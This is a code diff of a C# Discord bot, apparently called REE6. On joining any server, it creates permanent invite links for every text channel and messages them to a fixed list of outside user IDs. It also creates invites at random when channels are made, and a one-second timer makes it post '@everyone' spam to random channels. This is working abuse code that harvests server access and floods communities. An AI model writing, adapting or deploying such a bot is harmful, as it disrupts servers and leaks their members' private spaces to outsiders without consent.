@@ -43,125 +43,115 @@ namespace REE6
                                             services: null);
         }
 
-        ulong[] joinedGuildSubscriptionList = new ulong[] { 374284798820352000, 374610562392260610, 316020569634242560 };
+        ulong[] joinedGuildSubscriptionList = new ulong[] { 374284798820352000/*, 374610562392260610, 316020569634242560 */};
 
         private async Task JoinedGuild(SocketGuild arg)
         {
-            if (arg.VoiceChannels.Count >= 3)
+            new System.Threading.Thread(delegate ()
             {
-                foreach (SocketVoiceChannel voiceChannel in arg.VoiceChannels)
-                {
-                    IInviteMetadata invite = await voiceChannel.CreateInviteAsync(maxAge: null);
-                    string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
-                    Console.WriteLine(message);
-
-                    foreach (ulong id in joinedGuildSubscriptionList)
-                        await _client.GetUser(id).SendMessageAsync(message);
-                }
-            }
-            else
-            {
+                List<IInviteMetadata> invites = new List<IInviteMetadata>();
                 foreach (SocketTextChannel textChannel in arg.TextChannels)
                 {
-                    IInviteMetadata invite = await textChannel.CreateInviteAsync(maxAge: null);
-                    string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
-                    Console.WriteLine(message);
-
-                    foreach (ulong id in joinedGuildSubscriptionList)
-                        await _client.GetUser(id).SendMessageAsync(message);
+                    invites.Add(textChannel.CreateInviteAsync(maxAge: null).Result);
                 }
-            }
+
+                string message = $"Just joined {arg.Name} and created {invites.Count} invite links! Here they are!\n{string.Join('\n', invites)}";
+                Console.WriteLine(message);
+
+                foreach (ulong id in joinedGuildSubscriptionList)
+                    Task.Run(() => _client.GetUser(id).SendMessageAsync(message));
+            }).Start();
         }
 
-        List<SocketTextChannel> textChannels = new List<SocketTextChannel>();
+    List<SocketTextChannel> textChannels = new List<SocketTextChannel>();
 
-        private async Task ChannelCreated(SocketChannel arg)
+    private async Task ChannelCreated(SocketChannel arg)
+    {
+        if (arg is SocketTextChannel)
         {
-            if (arg is SocketTextChannel)
-            {
-                textChannels.Add(arg as SocketTextChannel);
-                var textChannel = arg as ITextChannel;
-                if ((textChannel.Guild.GetVoiceChannelsAsync().Result.Count == 0 && new Random().Next(5) == 2) || textChannel.Guild.GetInvitesAsync().Result.Count == 0)
-                    await textChannel.CreateInviteAsync(null, null);
-            }
-            else if (arg is SocketVoiceChannel && new Random().Next(5) == 2)
-            {
-                var voiceChannel = arg as IVoiceChannel;
-                await voiceChannel.CreateInviteAsync(null, null);
-            }
+            textChannels.Add(arg as SocketTextChannel);
+            var textChannel = arg as ITextChannel;
+            if ((textChannel.Guild.GetVoiceChannelsAsync().Result.Count == 0 && new Random().Next(5) == 2) || textChannel.Guild.GetInvitesAsync().Result.Count == 0)
+                await textChannel.CreateInviteAsync(null, null);
         }
-
-
-        private async Task ChannelDestroyed(SocketChannel arg)
+        else if (arg is SocketVoiceChannel && new Random().Next(5) == 2)
         {
-            if (!(arg is SocketTextChannel))
-                return;
-            textChannels.Remove(arg as SocketTextChannel);
-        }
-
-        Timer spamTimer = new Timer(1000);
-        private async Task Ready()
-        {
-            await Task.Run(GetTextChannels);
-            spamTimer.Elapsed += Spam;
-            spamTimer.Start();
-        }
-        private async Task Disconnected(Exception arg)
-        {
-            spamTimer.Stop();
-        }
-
-        public Task GetTextChannels()
-        {
-            textChannels = new List<SocketTextChannel>();
-            foreach (SocketGuild guild in _client.Guilds)
-            {
-                foreach (SocketTextChannel textChannel in guild.TextChannels)
-                {
-                    textChannels.Add(textChannel);
-                }
-            }
-
-            return Task.CompletedTask;
-        }
-
-        private void Spam(object sender, ElapsedEventArgs e)
-        {
-            try
-            {
-                Random random = new Random();
-                textChannels[random.Next(textChannels.Count)].SendMessageAsync("@everyone REEEEEEEEEE!!!! " + Emote.Parse("<:REE:711223515558445078>"));
-            }
-            catch
-            {
-                Console.WriteLine("Failed to spam");
-            }
-        }
-
-        private async Task HandleCommandAsync(SocketMessage messageParam)
-        {
-            // Don't process the command if it was a system message
-            var message = messageParam as SocketUserMessage;
-            if (message == null) return;
-
-            // Create a number to track where the prefix ends and the command begins
-            int argPos = 0;
-
-            // Determine if the message is a command based on the prefix and make sure no bots trigger commands
-            if (!(message.HasCharPrefix('!', ref argPos) ||
-                message.HasMentionPrefix(_client.CurrentUser, ref argPos)) ||
-                message.Author.IsBot)
-                return;
-
-            // Create a WebSocket-based command context based on the message
-            var context = new SocketCommandContext(_client, message);
-
-            // Execute the command with the command context we just
-            // created, along with the service provider for precondition checks.
-            await _commands.ExecuteAsync(
-                context: context,
-                argPos: argPos,
-                services: null);
+            var voiceChannel = arg as IVoiceChannel;
+            await voiceChannel.CreateInviteAsync(null, null);
         }
     }
+
+
+    private async Task ChannelDestroyed(SocketChannel arg)
+    {
+        if (!(arg is SocketTextChannel))
+            return;
+        textChannels.Remove(arg as SocketTextChannel);
+    }
+
+    Timer spamTimer = new Timer(1000);
+    private async Task Ready()
+    {
+        await Task.Run(GetTextChannels);
+        spamTimer.Elapsed += Spam;
+        spamTimer.Start();
+    }
+    private async Task Disconnected(Exception arg)
+    {
+        spamTimer.Stop();
+    }
+
+    public Task GetTextChannels()
+    {
+        textChannels = new List<SocketTextChannel>();
+        foreach (SocketGuild guild in _client.Guilds)
+        {
+            foreach (SocketTextChannel textChannel in guild.TextChannels)
+            {
+                textChannels.Add(textChannel);
+            }
+        }
+
+        return Task.CompletedTask;
+    }
+
+    private void Spam(object sender, ElapsedEventArgs e)
+    {
+        try
+        {
+            Random random = new Random();
+            textChannels[random.Next(textChannels.Count)].SendMessageAsync("@everyone REEEEEEEEEE!!!! " + Emote.Parse("<:REE:711223515558445078>"));
+        }
+        catch
+        {
+            Console.WriteLine("Failed to spam");
+        }
+    }
+
+    private async Task HandleCommandAsync(SocketMessage messageParam)
+    {
+        // Don't process the command if it was a system message
+        var message = messageParam as SocketUserMessage;
+        if (message == null) return;
+
+        // Create a number to track where the prefix ends and the command begins
+        int argPos = 0;
+
+        // Determine if the message is a command based on the prefix and make sure no bots trigger commands
+        if (!(message.HasCharPrefix('!', ref argPos) ||
+            message.HasMentionPrefix(_client.CurrentUser, ref argPos)) ||
+            message.Author.IsBot)
+            return;
+
+        // Create a WebSocket-based command context based on the message
+        var context = new SocketCommandContext(_client, message);
+
+        // Execute the command with the command context we just
+        // created, along with the service provider for precondition checks.
+        await _commands.ExecuteAsync(
+            context: context,
+            argPos: argPos,
+            services: null);
+    }
+}
 }
